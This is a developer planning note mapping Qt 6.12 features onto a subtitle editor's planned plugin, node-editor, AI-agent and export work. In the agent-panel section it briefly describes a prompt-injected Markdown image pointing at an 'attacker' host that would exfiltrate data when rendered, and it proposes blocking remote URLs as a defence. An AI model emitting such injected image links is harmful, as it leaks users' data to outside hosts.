# Qt 6.12 for wave 8: what the planned cards will build on

This note maps Qt 6.12.0 LTS onto the planned wave-8 work in [#410](https://github.com/altqx/hikari/issues/410),
card by card, so the owner can decide which 6.12 features the migration should adopt now because wave 8
builds on them. The version bump itself, its breaking changes and their effect on the existing code are in
the sibling note [qt-6.12-migration.md](qt-6.12-migration.md) and are not repeated here.

Sources read:

- The wave-8 tracking issue #410 and every card: HA1 #411, PL0–PL9 #412–#421, NE0–NE5 #422–#427,
  AI0–AI17 #428–#445, EX1–EX4 #448–#451 (`gh issue view`, 2026-10-30; no card has comments yet).
- [hikari-plugins.md](hikari-plugins.md), [node-effect-editor.md](node-effect-editor.md) and
  [hikari-ai-integration.md](hikari-ai-integration.md).
- The checkout at **`991d61480`** (main, 2026-10-30). Paths such as `cmake/HikariDependencies.cmake:8`
  refer to it.
- Qt primary sources, all fetched **2026-10-30**: the 6.12 docs on doc.qt.io (each page is linked where it
  is used), [What's New in Qt 6.12][whatsnew612], [New Classes and Functions in Qt 6.12][newclasses612],
  the [6.12.0 release notes][relnotes] on code.qt.io, the [Qt 6.12 release blog][blog612] and two linked
  posts ([Canvas2D][blog-canvas2d], [Hot Reload][blog-hotreload]), and the Qt online repository's
  `Updates.xml` for [6.11.2][repo-6112] and [6.12.0][repo-6120].

Terms follow [CONTEXT.md](../../CONTEXT.md). **Supported** means a Qt module or API with Qt's
compatibility promise; **tech preview** (TP) and **Labs** mean without it.

## 0. Summary

**Where Qt can reach in wave 8.** `hikari_core` and `hikari_application` link no Qt
(`src/core/CMakeLists.txt:7`, `src/application/CMakeLists.txt:22,33`), and the helpers are plain
`add_executable` targets (`src/helpers/lua/CMakeLists.txt:15`). So HA1's operation surface (#411), the
node engine (#423 says "no Qt" outright), the plugin helper (#414) and, if they follow
`src/application/matroska.cpp`, the export converters (#448–#451) get nothing from Qt 6.12. Qt 6.12 matters
in the UI (panels, canvas, agent panel), the backends (provider HTTP, MCP endpoint, sign-in) and the
composition root (QML engine setup).

**The 6.12 features wave 8 will lean on, in priority order:**

1. **Qt Canvas Painter**, now a supported module ([whatsnew612], [blog612]): `QCanvasPainterItem` as
   the renderer behind PL4's canvas draw list (#416), and optionally NE2's canvas background and minimap
   (#424). The QML `Canvas2D` element is still TP ([Canvas2D]). It draws on the GPU only, so it does not
   render under the software scene graph ([canvaspainter], [QQuickRhiItem]).
2. **Qt Quick Shapes**: wires for the NE2 canvas (#424), with `ShapePath.strokeGradient` new in 6.12
   ([ShapePath]). Unlike Canvas Painter, Shapes falls back to a software renderer ([Shape]), so offscreen
   tests keep working.
3. **Qt HTTP Server** (addon) for AI3's opt-in 127.0.0.1 MCP endpoint (#431): chunked replies for
   request-scoped SSE, and 6.12's connection limits ([httpserver], [QHttpServerConfiguration]).
4. **Qt Network Authorization** (addon, unchanged in 6.12) for AI6's PKCE and loopback sign-ins (#434)
   ([QOAuth2AuthorizationCodeFlow], [QOAuthHttpServerReplyHandler]).
5. **QML engine changes for PL8's custom QML panels** (#420): missing required properties are now an error,
   plus `QQmlEngine::setExternalSingletonInstance()` and a fix for `addImportPath()` at runtime
   ([whatsnew612], [relnotes]). QML still has no privacy domains ([untrusted]), which confirms the
   unrestricted-only decision.
6. **Safe text display** for model output and plugin strings (#435, #416, #430): `Qt.escapeHtml()` is new
   ([Qt global]). The 6.12 `Text` docs also warn that auto-detected rich text or Markdown can load remote
   images ([Text]).
7. **Models**: `QRangeModel` sorting and `match()` (#416, #418, #433, #435, #441, #424) and
   `QSortFilterProxyModel::dataChangeRelevanceFlags()` for the Grid filter under AI2 review marks (#430)
   ([QRangeModel], [QSortFilterProxyModel]).
8. **Accessibility and rendering hints**: `Accessible.expandable`/`expanded`, ListView viewport
   accessibility, `motionPreference` and `Item.mutabilityGroup` (#416, #424, #435)
   ([Accessible], [relnotes], [QAccessibilityHints], [Item]).
9. **QML Hot Reload**, for development only: faster iteration on the five design-gated cards (#416, #424,
   #430, #435, #436) ([blog-hotreload]).

**Adopt now (the migration card), for the owner to confirm:**

- **Decide which addons the 6.12 SDK lock requests.** Today it requests only the base package,
  `qtmultimedia` and `qtshadertools` (`cmake/locks/qt-linux.lock.json`, `"requested"`). Wave 8 needs
  `qtcanvaspainter` (PL4/NE2), `qthttpserver` (AI3), which pulls in `qtwebsockets`, and `qtnetworkauth`
  (AI6) ([repo-6120]). The bump regenerates both locks anyway, so adding them now is cheaper than a second
  lock change. Recommended now: `qtcanvaspainter`. The other two can wait for AI3/AI6.
- **Prove Canvas Painter renders on both CIs, and decide how offscreen suites treat it.** A
  `QCanvasPainterItem` smoke test on Linux xvfb and Windows MSVC CI is enough. The software scene graph
  draws nothing for it ([QQuickRhiItem]), and Hikari's offscreen suites are its "deterministic software
  rasterizer" (`cmake/HikariTesting.cmake:80`).
- **Block remote URLs in the QML engine.** Wave 8 shows untrusted text from models and plugins in QML.
  One `QQmlNetworkAccessManagerFactory` in the composition root ([QQmlEngine]) closes the image-loading
  path that the [Text] warning describes, for every later card.
- **Optional:** a development-only preset with `QT_QML_DEBUG` for Hot Reload, never in packages or CI
  ([blog-hotreload]).

**Not for wave 8 now:** `Canvas2D` (TP), Qt TaskTree (TP), Qt OpenAPI (TP), StyleKit (Labs), the Native
style, gRPC, Remote Objects, SCXML, WebSockets, the language server's JSON-RPC (an internal module), Graphs
and QRhi indirect draws (§6).

## 1. What frames every card

- **Binary compatible, LTS.** "The Qt version 6.12 series is binary compatible with the 6.11.x series"
  ([relnotes]). 6.12 gets five years of maintenance ([blog612]). Wave 8 will likely ship on it for its whole
  run, so TP APIs that change in 6.13 would mean pinning or porting.
- **No new addon in 6.12.** The online repository lists the same 34 addons for 6.11.2 and 6.12.0
  ([repo-6112], [repo-6120]). Canvas Painter, OpenAPI, TaskTree and StyleKit came in 6.11 as TP
  ([whatsnew611]). In 6.12 only Canvas Painter's core API left TP ([whatsnew612]). TaskTree and OpenAPI are
  still TP ([tasktree], [openapi]).
- **What Hikari has today.** `find_package` asks for Core, Gui, Qml, Quick, Multimedia, Network and Svg,
  plus DBus on Linux (`cmake/HikariDependencies.cmake:8,11`). Any addon means a lock entry, a deployment
  manifest entry (`cmake/manifest/QtDeploymentManifest.cmake`) and a licence entry.
- **Licences.** Canvas Painter and HTTP Server are GPLv3 or commercial, with no LGPL
  ([canvaspainter], [httpserver]). HikariSub is GPLv3 (`LICENSE`), so both fit, but they must not reach
  anything distributed under weaker terms. TaskTree and StyleKit are LGPLv3/GPL ([tasktree], [stylekit]).
- **No WebEngine.** Qt 6.12 no longer ships Qt WebEngine or Qt PDF with the release ([relnotes]). That
  changes nothing: webview panels were rejected (hikari-plugins.md §4.4).

## 2. HA1, the Hikari API (#411)

HA1 sits in the Qt-free application layer (§0). It covers operations, JSON Schemas, staged writes, events
and `--export-docs` (#411).

- **No JSON Schema validator or public JSON-RPC in Qt 6.12.** Neither the [whatsnew612] nor the
  [newclasses612] lists one. `qtlanguageserver`'s JSON-RPC is `JsonRpcPrivate`, an `INTERNAL_MODULE`,
  `STATIC` ([jsonrpc-cmake]). HA1's schemas, AI1's tool schemas (#429) and AI3/AI13/AI15's JSON-RPC
  (#431, #441, #443) are Hikari code or a vcpkg port. JSON changes in 6.12 are cosmetic: `QJsonObject`
  `cbegin()`/`cend()` and rvalue `QJsonDocument` constructors ([whatsnew612]).
- **Exposing HA1 to Hikari's own QML** (for PL4's renderer and the AI panel): `setExternalSingletonInstance()`
  lets the composition root hand the engine a ready-made singleton wired to backends, and `QML_UNCREATABLE`
  now combines with `QML_SINGLETON` ([QQmlEngine], [whatsnew612]). Status: supported. **Adopt:** wave 8
  (HA1 or PL4), when a QML facade is added.
- **Invokable argument coercion changed.** Invokable methods with `QString` parameters now receive the
  strings `"null"`/`"undefined"` from JavaScript `null`/`undefined`, and JS arrays always arrive as
  `QVariantList` ([relnotes], qtdeclarative 60cc1b60f3). Any HA1 method reachable from QML must validate
  its input rather than rely on an empty string. **Adopt:** wave 8 (HA1 tests).

## 3. Plugins (PL0–PL9)

### PL0 ADR: HikariSub plugins (#412)

- **QML trust model, unchanged in 6.12.** "QML does not have the concept of separate privacy domains" and
  any loaded code "can access all data in its scope" ([untrusted]). `addImportPath()` still says "Qt
  assumes that all files and folders under path come from a trusted source" ([QQmlEngine]). The 6.12
  release notes add no import filter or sandbox ([relnotes]). The ADR can cite the 6.12 pages for the
  decision that only unrestricted plugins ship QML (#410, #420).
- **Canvas Painter's limits shape the draw-list vocabulary** (see PL4). **Adopt:** record in the ADR.

### PL1 Package, manifest, install and signatures (#413)

- Nothing in 6.12 for zip, minisign or JSON Schema. Two small helpers for install writes: `QFile::copy()`
  takes explicit permissions, and `QSaveFile` applies requested permissions only at `commit()`
  ([whatsnew612]). Plugin files can be written without stray execute bits. Status: supported. **Adopt:**
  wave 8 (PL1).

### PL2 Plugin helper and API skeleton (#414)

- The helper is a non-Qt process like `hikari_lua_helper` (`src/helpers/lua/CMakeLists.txt:15`).
  Nothing in 6.12 applies to it, and 6.12's generated Windows manifest (long paths, execution level)
  only reaches `qt_add_executable` targets ([whatsnew612], Windows).
- **Plugin commands in menus** (`plugin.<id>.<command>`, #414): `MenuItem` now shows the shortcut of its
  `Action` (opt out with `Qt::AA_DontShowShortcutsInContextMenus`), and `Menu.separatorsCollapsible` hides
  orphaned separators when items are hidden, for example while a plugin is disabled ([relnotes],
  qtdeclarative b10f78ed88, 31296fd078). Status: supported. **Adopt:** wave 8 (PL2). How the bump changes
  Hikari's existing menus is the sibling note's subject.

### PL3 Document API (#415)

- Application layer; no Qt 6.12 feature applies.

### PL4 Declarative panels, dynamic docks, plugin manager (#416)

- **Canvas draw list → `QCanvasPainterItem`.** Restricted plugins draw through "a canvas draw list"
  (#410, #416): rects, lines, paths, text and package images (hikari-plugins.md §4.2). A C++
  `QCanvasPainterItem` subclass can replay the list on the GPU with no JavaScript in between
  ([QCanvasPainterItem]). Canvas Painter's core is supported in 6.12 ([whatsnew612]). New in 6.12:
  `QCanvasPath::addPath()` parses SVG path strings, and fills can use the EvenOdd rule ([whatsnew612]).
  A draw list can therefore carry SVG path data unchanged.
  - **Limits to design around:** rectangle-only clipping, no dashes, no hit testing of paths, no stroked
    text, no filters, three composite modes ([QCanvasPainter]). If the draw list promises any of these,
    its renderer cannot keep that promise.
  - **No software fallback:** "Qt Canvas Painter is designed for GPU rendering and does not have a CPU
    backend" ([canvaspainter]). `QQuickRhiItem`, its base, "will not be functional when using the software
    adaptation" ([QQuickRhiItem]). Offscreen evidence for the canvas needs an RHI path.
  - **Not `Canvas2D`:** the QML element is TP with "no source or binary compatibility guarantee yet"
    ([blog-canvas2d], [Canvas2D]), and drawing through it would push the draw list through JavaScript.
  - **The alternative** is today's Qt Quick `Canvas` (QPainter into a texture, CPU), which works offscreen
    and has dashes and path clipping ([blog-canvas2d] comparison table). Hikari already uses it in eight
    places, e.g. `src/ui/VisualOverlay.qml:89`.
  - Status: supported (C++), TP (QML). **Adopt:** lock and smoke test now (§0); renderer in PL4.
- **Package images in the draw list:** `QImageReader::effectiveSize()` gives the size after EXIF rotation
  before decoding ([whatsnew612]), so a size cap can be checked first. **Adopt:** wave 8.
- **Plugin strings in panels:** keep `textFormat: Text.PlainText`. Auto-detected StyledText or Markdown
  "includes loading images remotely over the network" ([Text]). Where a label mixes Hikari markup with
  plugin text, `Qt.escapeHtml()` (new in 6.12) escapes it in QML ([Qt global]). **Adopt:** wave 8, plus
  the engine-wide remote block now (§0).
- **Widget-tree rendering:** the renderer creates PK1 controls from tree nodes. With 6.12, a component
  whose required properties cannot be set (for example a type mismatch from a malformed node) is no longer
  created ([relnotes], qtdeclarative e6b698c2e7). That makes required properties a cheap guard. **Adopt:**
  wave 8.
- **Icon-only tool strips with hover names** (owner rule): `ToolTip.policy` (new in 6.12) shows the
  attached tooltip automatically for items that set `ToolTip.text` and do not bind `visible`
  ([ToolTip]). Plugin buttons then get hover names without per-item bindings. **Adopt:** wave 8.
- **Lists and trees:** `Accessible.expandable`/`expanded` (new in 6.12, [Accessible]), with AT-SPI now
  notifying expanded-state changes on Linux ([whatsnew612]), for tree rows. ListView now exposes its
  visible range and item count through `QAccessibleViewportInterface` ([relnotes], qtdeclarative
  eb25b82d40). **Adopt:** wave 8.
- **The plugin manager list:** `QRangeModel` now sorts itself (`sortRole`, `sortCollator` for
  locale-aware order) and implements `match()` ([QRangeModel], [whatsnew612]). An installed-plugins list
  can be a `QRangeModel` over a `std::vector` with no proxy. Status: supported. **Adopt:** wave 8.

### PL5 Files and network (#417)

- Requests are made by Hikari's `QNetworkAccessManager` (#417). 6.12 adds no request policy API. The
  host check, HTTPS-only rule and global switch are Hikari code. `QRestAccessManager` and
  `QNetworkRequestFactory` (since 6.7, not marked TP in the 6.12 docs) give a base URL plus headers per host ([QRestAccessManager]).
  6.12 fixes worth having: NAM high CPU when nftables rejects packets (QTBUG-141419), and stale state after
  an IPv6↔IPv4 switch (QTBUG-143921) ([relnotes]). **Adopt:** comes with the bump.

### PL6 Curated index and updates (#418)

- Index browsing: `QRangeModel` sort and `match()` as in PL4. The QML `SortFilterProxyModel` gained
  `RegExpFilter`, `RangeFilter`, `AllOfFilter` and `AnyOfFilter` in 6.12, but the type is still TP
  ([whatsnew612], [SFPM QML]). Hikari's existing filters are C++ `QSortFilterProxyModel` subclasses
  (`src/ui/line_table_model.h:218`). **Adopt:** wave 8; prefer C++ proxies.

### PL7 OS sandbox (#419)

- Nothing in Qt. Landlock and AppContainer are platform APIs (hikari-plugins.md §5.3).

### PL8 Unrestricted tier and custom QML panels (#420)

"The plugin ships QML that Hikari loads with an `api` object" (#420).

- **Passing `api`:** make `api` a required property and create the panel with initial properties. In 6.12
  the engine refuses to create a component whose required properties cannot be set, instead of creating
  it incomplete ([whatsnew612], [relnotes] e6b698c2e7). Status: supported. **Adopt:** wave 8.
- **Engine per plugin or shared:** with one shared engine, a singleton is engine-wide, so a per-plugin
  `api` cannot be a singleton. With one `QQmlEngine` per plugin (the MuseScore model, hikari-plugins.md
  §4.1), `setExternalSingletonInstance()` can give each engine its own `api` singleton ([QQmlEngine]).
  This is an open question (§8).
- **Import paths at runtime:** calling `addImportPath()` used to stop asynchronously loading components
  from ever becoming ready. That is fixed in 6.12 (QTBUG-146210, [relnotes]). It only matters if plugin
  QML folders are added as import paths after start-up. Loading by URL avoids it.
- **Argument coercion:** see §2. The `api` object must validate everything it receives.
- **Hot Reload is not a plugin-author feature.** It needs a build with `QT_QML_DEBUG`, which "opens a
  debug port … Don't ship it" ([blog-hotreload]). A "Reload plugin" command that recreates the panel is
  Hikari's own work.

### PL9 Authoring guide and API reference (#421)

- No 6.12 feature applies. The reference is generated from HA1's `--export-docs` (#411).

## 4. Node effect editor (NE0–NE5)

NE0 (#422), NE1 (#423), NE3 (#425) and NE4 (#426) are engine, format and golden work in the Qt-free
application layer ("a native, typed, deterministic engine in `hikari::application` (no Qt)", #423). No Qt
6.12 feature applies to them. For the same reason `QEasingCurve::fromCubicBezier()` (new in 6.12,
[whatsnew612]) is no use to a Retime or easing node. NE5 (#427) adds nodes on the same engine.

### NE2 The node-editor mode and canvas (#424)

Decided: "custom Qt Quick + QtQuick.Shapes" (#410, #424); nodes are ordinary Hikari controls
(node-effect-editor.md §4).

- **Wires: Shapes.** `ShapePath.strokeGradient` (new in 6.12, with `LinearGradient` and the other
  advanced gradient types) lets a wire fade from its output port's type colour to its input port's
  ([ShapePath]). `Shape.CurveRenderer` (since 6.6) keeps Bézier wires smooth at any zoom, and
  `asynchronous` moves path preprocessing to worker threads ([Shape]). Shapes falls back to
  `SoftwareRenderer` under the software scene graph ([Shape]), so NE2 can be tested offscreen like the
  rest of Hikari. Status: supported. **Adopt:** wave 8.
- **Background grid and minimap (optional):** Canvas Painter has grid patterns and path caching for many
  segments ([blog-canvas2d]). This carries PL4's GPU-only caveat. A `Shape` or a small `ShaderEffect`
  also works. **Adopt:** wave 8 decides; it costs nothing extra if the lock already has the module.
- **Many items:** `Item.mutabilityGroup` (new in 6.12) keeps "rapidly updated geometry" (the wire under
  the pointer, a moving node) out of batches with static geometry ([Item]). Effectively invisible items
  no longer trigger re-rendering ([relnotes], qtdeclarative 3c560a156d). **Adopt:** wave 8, after
  profiling.
- **Hover while the canvas moves:** hover and cursor updates under animating items now come at most every
  100 ms by default (`QT_QUICK_FRAME_SYNCHRONOUS_HOVER_INTERVAL`) ([relnotes], qtdeclarative 4c4e7bbfa7).
  Port highlights during a pan or an animated move may lag. Test this in NE2.
- **Accessibility:** `Accessible.expandable`/`expanded` for group nodes ([Accessible]);
  `motionPreference` (new in 6.12; reachable through `QStyleHints::accessibility`) to turn off wire and
  run animations under reduced motion ([QAccessibilityHints], [QStyleHints]). **Adopt:** wave 8.
- **Pointer handlers, TableView, TreeView:** 6.12 brings fixes only (for example TableView
  `topRow`/`bottomRow` bindings, QTBUG-142067; TapHandler under an open popup with a stylus, QTBUG-135879)
  ([relnotes]). Nothing new to design around.
- **Node palette search:** `QRangeModel` sort and `match()` over the versioned catalogue (#423).
  **Adopt:** wave 8.

## 5. AI integration (AI0–AI17)

### AI0 ADR (#428), AI1 tool schemas (#429)

- Application layer (#428: "tool surface on HA1 in the application layer"). See §2 on JSON Schema and
  JSON-RPC. No 6.12 feature applies.

### AI2 Staged review, Keep/Undo and checkpoints (#430)

- **Grid marks without re-filtering.** Review marks per Line change data roles on the Grid's model.
  `QSortFilterProxyModel::dataChangeRelevanceFlags()` (new in 6.12) lets `LineFilterModel`
  (`src/ui/line_table_model.h:218`) declare those roles irrelevant to filtering and sorting
  ([QSortFilterProxyModel], [relnotes] c06d96392f6). Large change sets then stop re-running the filter.
  NE runs that write many Lines (#423) benefit the same way. Status: supported. **Adopt:** wave 8.
- **Diff marks in the Line editor:** `Text`, `TextEdit` and `TextInput` now draw every
  `QTextCharFormat` underline style (dash, dot, wave, spell-check) and underline colours ([relnotes]
  e44e7f61c8). AI changes can then be marked apart from the spelling and grammar marks. Only with the RHI
  renderer: "The software renderer falls back to SingleUnderline" (same entry). Offscreen screenshots will
  not show the difference. **Adopt:** wave 8.
- **Escaping Line text into markup:** ASS text can contain `<` and `&`. `Qt.escapeHtml()` for any diff
  built as StyledText ([Qt global]). **Adopt:** wave 8.

### AI3 MCP server (#431)

"A stdio bridge and an opt-in 127.0.0.1 Streamable HTTP endpoint …, Origin check and token" (#431).

- **Qt HTTP Server** fits the opt-in endpoint:
  - It serves HTTP/1.1 and HTTP/2 and binds to a `QTcpServer`, `QSslServer` or `QLocalServer`
    ([httpserver]).
  - `QHttpServerResponder::writeBeginChunked()`/`writeChunk()` (since 6.8) can stream a request-scoped
    SSE reply ([QHttpServerResponder]).
  - Hardening knobs: rate limits, allowlists, header and body limits, and in 6.12
    `setMaximumConnections()` and `setMaximumConnectionsPerHost()`
    ([QHttpServerConfiguration], [httpserver-security]).
  - Qt says to use it "only for local connections or in a trusted network", which is what MCP asks of a
    local server anyway ([httpserver]). Origin and token checks remain Hikari code (a route handler or
    `addAfterRequestHandler`).
  - Status: supported addon, GPLv3. In the repository it depends on `qtwebsockets` ([repo-6120]).
  - **Adopt:** owner decision, in the lock now or with AI3 (§8).
- **The stdio bridge** (`HikariSub --mcp` to the running instance over a local socket,
  hikari-ai-integration.md §3.1) uses `QLocalServer`/`QLocalSocket`. Nothing changed in 6.12.

### AI4 Frame tools (#432), AI9 typesetting tools (#437)

- No 6.12 feature applies. Crops and encodes are `QImage` work, and render-and-compare uses the existing
  libass path (hikari-ai-integration.md §4.2).

### AI5 Provider layer (#433)

"HTTP + SSE client on Qt Network" (#433).

- 6.12 adds no SSE parser and no streaming helper ([whatsnew612], Qt Network: only `QSslKeyingMaterial`,
  `QHostInfo::clearCache()`, `QHttpHeaders` ranges and OpenSSL 4). The client stays `QNetworkReply`
  `readyRead` plus an incremental parser, as the AI note planned. `QRestAccessManager` and
  `QNetworkRequestFactory` (since 6.7) give per-provider base URLs and headers
  ([QRestAccessManager]). HTTP/2 is allowed by default for TLS requests ([QNetworkRequest],
  `Http2AllowedAttribute`). The NAM fixes from PL5 help long streams. **Adopt:** comes with the bump.
- **Model catalogue and per-role pickers:** `QRangeModel` with `sortCollator` and `match()`
  ([QRangeModel]). **Adopt:** wave 8.
- Not Qt OpenAPI: TP, and it needs a Java 17 JDK plus the upstream OpenAPI generator at build time
  ([openapi]). Not Qt gRPC: the providers speak JSON over HTTP.

### AI6 Sign-in flows (#434)

- **Qt Network Authorization** (addon, no 6.12 feature changes, [whatsnew612]):
  - `QOAuth2AuthorizationCodeFlow` with `PkceMethod::S256` (since 6.8) ([QOAuth2AuthorizationCodeFlow]).
  - `QOAuthHttpServerReplyHandler` for the loopback redirect ([QOAuthHttpServerReplyHandler]). Its
    `listen()` defaults to `QHostAddress::Any`; pass `LocalHost` to get `127.0.0.1` in the redirect URI
    (same page).
  - `idToken` and `nonce` (since 6.9) ([QAbstractOAuth2]). No JWT signature check is documented, so the
    JWKS check in OpenAI's flow (#434) is Hikari's.
  - Status: supported addon. **Adopt:** owner decision on the lock (§8); usage in AI6.
- **Opening the browser on Linux:** `QDesktopServices::openUrl()` now prefers the
  `org.freedesktop.portal.OpenURI` portal, and "the portal may behave differently than the applications
  used before" ([whatsnew612], Linux). Every sign-in starts there, so AI6's real-endpoint evidence should
  cover it.

### AI7 Agent panel and loop (#435)

- **Rendering replies:** `Text`/`TextEdit` with `MarkdownText` cover CommonMark plus GitHub tables and
  task lists ([TextEdit]). That support predates 6.12; 6.12 only fixes the font size of backtick code
  (QTBUG-97041, [relnotes]). There is no incremental Markdown append: `append()`/`insert()` are for
  plain or rich text ([TextEdit]). A streamed reply is re-parsed per update, or rendered block by block.
  - **Security:** auto-detected or Markdown text can load remote images ([Text]). A prompt-injected
    `![](https://attacker/?q=…)` in a reply would then be fetched. Block remote URLs engine-wide (§0) or
    strip images before display.
  - Status: supported. **Adopt:** the URL block now; the rendering choice is AI7's (§8).
- **The thread view:** ListView's new `QAccessibleViewportInterface` ([relnotes] eb25b82d40), and
  `Accessible.expandable`/`expanded` for collapsible tool-call blocks ([Accessible]).
  `Item.DynamicMutabilityGroup` for the message being streamed ([Item]). `motionPreference` for
  streaming animations ([QAccessibilityHints]). **Adopt:** wave 8.
- **Threads list, model picker, tool search:** `QRangeModel` sort and `match()` ([QRangeModel]).
- **Prompt box:** Backspace now deletes whole multi-code-unit emoji ([whatsnew612], `QTextCursor`).
  Comes with the bump.
- **The agent loop** (queue, steer, compaction, retries): Qt TaskTree could express it, but it is TP in
  6.12 ([tasktree]). See §8.

### AI8 Inline actions (#436)

- Same review and text concerns as AI2 and AI7. No separate 6.12 feature.

### AI10 Translation pipeline (#438)

- Honya's "pre-pass, translator, automatic checks, reviewer with retries, coherence sweep" (#438) is a
  task workflow. **Qt TaskTree** composes exactly that: sequential and parallel groups, workflow policies
  (`StopOnError`, `ContinueOnError` …), loops, timeouts, and adapters for `QNetworkReply`, `QProcess` and
  threads ([tasktree]). It is TP ("excluding its API from Qt's compatibility promises") and LGPL/GPL
  ([tasktree]). It was new in 6.11, and 6.12 only adds `For(qsizetype)`, `Forever`→`Group` conversion and a
  `ListIterator` overload ([whatsnew612]). **Adopt:** not in the migration. Owner decision for AI10 (§8).

### AI11 Karaoke tools (#439), AI12 automation (#440), AI14 skills (#442), AI16 effects tools (#444), AI17 plugin tools (#445)

- No 6.12 feature applies. External programs (WhisperX, MFA) are `QProcess` as today; nothing changed
  in 6.12 apart from `QDesktopServices` no longer falling back to `system()` in builds without
  `QProcess` ([relnotes]). AI12 runs through the non-Qt Lua helper. AI16 and AI17 sit on NE1 and PL3.

### AI13 MCP client (#441), AI15 ACP client (#443)

- stdio servers and agents are `QProcess` with newline-delimited JSON-RPC (hikari-ai-integration.md
  §3.1, §1.2). Remote MCP servers use the AI5 HTTP client. Neither needs WebSockets. Qt's only JSON-RPC
  code is internal (§2). Server, tool and agent lists: `QRangeModel` ([QRangeModel]). **Adopt:** wave 8.

## 6. Export and import (EX1–EX4)

The open document stays ASS and an export writes a copy (#448). If the converters live beside
`src/application/matroska.cpp`, they are Qt-free and no Qt API applies. If they are placed in a backend
adapter, the following applies.

- **EX1 (#448):** SRT, WebVTT, SBV and plain text are text. `QSaveFile` now defers permissions until
  `commit()` ([whatsnew612]). The export dialog is DG1/PK1 (#448). No 6.12 feature to design around.
- **EX2 TTML/DFXP (#449):** `QXmlStreamWriter` (Qt Core) can write it. Qt 6 has no XSD validation, so the
  IMSC1 schema check (#449) is a CI tool outside Qt. No 6.12 change to the writer ([relnotes]).
- **EX3 srv3 (#450):** output must equal YTSubConverter 1.6.5's byte for byte (#450). A hand-written
  serializer that copies its exact declaration, quoting and whitespace is safer than any Qt writer. No 6.12
  feature applies.
- **EX4 srv3 import (#451):** this parses user-supplied XML. In 6.12 `QXmlStreamReader` enforces
  `entityExpansionLimit()` exactly and rejects limits below 1 ([relnotes] a420ae5522d, 8566632bf9b), so
  entity-expansion bombs are bounded. If Qt XML's `QDomDocument` were used instead (Hikari does not link
  `Qt6::Xml`), its factory functions now return null nodes for data invalid under XML 1.0 by default
  (`ReturnNullNode` since 6.12, [QDomImplementation]; [relnotes] 87c5b3e99c6). The release lists
  CVE-2026-15037 against qtbase without naming the commit ([relnotes]). **Adopt:** wave 8; prefer
  `QXmlStreamReader`.
- `QDateTime`/`QDate`/`QTime::fromString()` are faster in 6.12 ([whatsnew612]). srv3 times are integer
  milliseconds, and TTML is only written, so this does not matter here.

## 7. Features that do not help wave 8

- **`Canvas2D` (QML):** TP ([Canvas2D]); for PL4 the supported C++ item is the better base.
- **Qt OpenAPI:** TP, Java toolchain at build time, and no model of streamed replies ([openapi]).
- **Qt TaskTree:** useful for AI10 but TP in an LTS ([tasktree]); owner's call (§8).
- **Qt Labs StyleKit:** Labs; Hikari has its own Fusion-based theme layer (14 files import
  `QtQuick.Controls.Fusion`) ([stylekit]).
- **`QtQuick.Controls.Native`:** compile-time platform style ([whatsnew612]); Hikari's look is its own.
- **Qt gRPC compression and limits:** no provider uses gRPC ([whatsnew612]).
- **Qt Remote Objects:** Qt-to-Qt object replication ([remoteobjects]); the helpers are non-Qt and keep
  their own protocol (#414).
- **Qt SCXML:** statechart engine ([scxml]); the permission modes are a small state machine in code.
- **Qt WebSockets:** neither MCP nor ACP needs it ([websockets]); it arrives only as HTTP Server's
  dependency.
- **Qt Language Server:** its JSON-RPC is an internal static module ([jsonrpc-cmake]).
- **Qt Graphs (LogValueAxis, Canvas Painter backend):** no chart in any card ([whatsnew612]).
- **QRhi indirect draws, Vulkan device-fault reports:** no custom RHI rendering planned ([whatsnew612]).
- **rcc deduplication:** automatic, no wave-8 work ([whatsnew612]).
- **`Color` QML singleton, `Rectangle.color` reset, `AnimatedImage` loops:** cosmetic ([whatsnew612]).
- **`SearchField` additions:** Hikari uses no `SearchField` today ([whatsnew612]).
- **Qt Qml Design Support (`ObjectRegistry`):** "meant for future Qt Quick design tooling"
  ([whatsnew612]).
- **`QEasingCurve::fromCubicBezier()`:** the node engine has no Qt (#423).
- **`QSslKeyingMaterial`, `QHttpHeaders` ranges, `QHostInfo::clearCache()`:** no wave-8 use
  ([whatsnew612]).
- **Multimedia, Quick 3D, Lottie, HarmonyOS, Android, WebAssembly items:** out of scope ([whatsnew612]).

## 8. Open questions for the owner

1. **The SDK lock for 6.12.** Request `qtcanvaspainter` now (PL4/NE2)? `qthttpserver` with its
   `qtwebsockets` dependency (AI3) and `qtnetworkauth` (AI6) now, or when those cards start? Canvas
   Painter and HTTP Server are GPL-only ([canvaspainter], [httpserver]).
2. **PL4's canvas renderer.** Choose between:
   - `QCanvasPainterItem`: GPU, supported, no dashes or path clipping, nothing in software rendering;
   - Qt Quick `Canvas`: CPU, dashes and path clips, works offscreen;
   - Shapes.

   Also: is the draw-list vocabulary limited to what Canvas Painter can draw ([QCanvasPainter])?
3. **Evidence for GPU-only items.** Run canvas suites on xvfb only, or add an RHI-backed offscreen mode?
   Today's offscreen suites use the software rasterizer (`cmake/HikariTesting.cmake:80`).
4. **AI3's HTTP endpoint.** Qt HTTP Server (supported, GPL, "local or trusted network" only), or a minimal
   HTTP layer on `QTcpServer`?
5. **Qt TaskTree for AI10 and the AI7 loop.** Accept a TP module on an LTS (pinned, ported when it
   changes), or write the orchestration with signals and `QFuture`?
6. **AI7's Markdown.** `Text.MarkdownText` re-parsed per streamed update, or Hikari's own block renderer?
   Either way: block remote URLs in the QML engine now, as one change for the whole app?
7. **Hot Reload.** Add a development-only `QT_QML_DEBUG` preset for the design-gated cards (PL4, NE2, AI2,
   AI7, AI8), run under `vx11` like other GUI work? The `<exe>_qmlpreview` target is generated "for each
   executable with a QML module" ([whatsnew612]). Hikari's QML module is the `hikari_ui` library
   (`src/ui/CMakeLists.txt:19`), so whether `hikarisub_qmlpreview` appears needs checking.
8. **PL8's engine.** One shared `QQmlEngine` (the `api` object as a required property) or one engine per
   unrestricted plugin (an `api` singleton per engine via `setExternalSingletonInstance()`)?

## Sources

All fetched 2026-10-30.

[whatsnew612]: https://doc.qt.io/qt-6/whatsnew612.html
[newclasses612]: https://doc.qt.io/qt-6/newclasses612.html
[whatsnew611]: https://doc.qt.io/qt-6/whatsnew611.html
[relnotes]: https://code.qt.io/cgit/qt/qtreleasenotes.git/about/qt/6.12.0/release-note.md
[blog612]: https://www.qt.io/blog/qt-6.12-released
[blog-canvas2d]: https://www.qt.io/blog/canvas2d-new-qml-canvas-element-using-qt-canvas-painter
[blog-hotreload]: https://www.qt.io/blog/hot-reload-in-qt-6.12
[repo-6112]: https://download.qt.io/online/qtsdkrepository/linux_x64/desktop/qt6_6112/qt6_6112/Updates.xml
